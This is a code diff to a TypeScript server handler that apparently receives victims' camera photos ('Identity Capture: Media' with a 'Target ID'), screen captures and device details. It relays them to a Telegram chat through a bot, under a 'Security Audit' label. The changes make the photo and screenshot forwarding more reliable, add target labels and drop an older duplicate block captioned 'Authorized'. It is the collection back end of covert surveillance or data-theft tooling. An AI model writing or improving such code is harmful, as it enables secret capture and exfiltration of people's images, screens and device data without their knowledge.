@@ -202,7 +202,7 @@ async function startServer() {
       const data = req.body as any;
       let extraMsg = `📎 <b>Security Audit: Advanced Modules</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n`;
-      let hasData = false;
+      let hasTextData = false;
       
       const addSection = (title: string, content: string) => {
         if (extraMsg.length + content.length > 3900) {
@@ -210,25 +210,35 @@ async function startServer() {
             extraMsg = `📎 <b>Continued Audit Logs</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
         }
         extraMsg += `<b>${title}</b>\n${content}\n\n`;
-        hasData = true;
+        hasTextData = true;
       };
 
+      // 1. Handle Images (Media Capture)
       if (data.visual_identity) {
         try {
-          const base64Data = data.visual_identity.replace(/^data:image\/\w+;base64,/, "");
+          const base64Data = data.visual_identity.includes(',') ? data.visual_identity.split(',')[1] : data.visual_identity;
           const buffer = Buffer.from(base64Data, 'base64');
-          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: '📸 <b>Identity Capture: Media</b>', parse_mode: 'HTML' }).catch(() => {});
-          hasData = true;
-        } catch(e) {}
+          if (buffer.length > 0) {
+            botInstance.telegram.sendPhoto(chatId, { source: buffer }, { 
+              caption: '📸 <b>Identity Capture: Media</b>\nTarget ID: <code>' + id + '</code>', 
+              parse_mode: 'HTML' 
+            }).catch(err => console.error('Error sending media photo:', err));
+          }
+        } catch(e) { console.error('Buffer processing error (visual_identity):', e); }
       }
 
+      // 2. Handle Images (Screen Capture)
       if (data.screen_capture) {
         try {
-          const base64Data = data.screen_capture.replace(/^data:image\/\w+;base64,/, "");
+          const base64Data = data.screen_capture.includes(',') ? data.screen_capture.split(',')[1] : data.screen_capture;
           const buffer = Buffer.from(base64Data, 'base64');
-          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: '🖥️ <b>Identity Capture: Screen</b>', parse_mode: 'HTML' }).catch(() => {});
-          hasData = true;
-        } catch(e) {}
+          if (buffer.length > 0) {
+            botInstance.telegram.sendPhoto(chatId, { source: buffer }, { 
+              caption: '🖥️ <b>Identity Capture: Screen</b>\nLabel: <code>' + (data.screen_label || 'Default') + '</code>', 
+              parse_mode: 'HTML' 
+            }).catch(err => console.error('Error sending screen photo:', err));
+          }
+        } catch(e) { console.error('Buffer processing error (screen_capture):', e); }
       }
 
       if (data.hardware_brand_profile) {
@@ -393,23 +403,7 @@ async function startServer() {
                     `└ Orientation: <code>${data.orientation}</code>`);
       }
 
-      // Image delivery
-      if (data.screen_capture) {
-        try {
-          const buffer = Buffer.from(data.screen_capture.split(',')[1], 'base64');
-          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `🖥️ Screen Diagnostics [Authorized]` }).catch(() => {});
-          hasData = true;
-        } catch(e) {}
-      }
-      if (data.visual_identity) {
-        try {
-          const buffer = Buffer.from(data.visual_identity.split(',')[1], 'base64');
-          botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `📸 Identity Capture [Authorized]` }).catch(() => {});
-          hasData = true;
-        } catch(e) {}
-      }
-
-      if (hasData) {
+      if (hasTextData) {
         extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
                     `✅ <b>Data Synchronization Complete.</b>`;
         botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error);
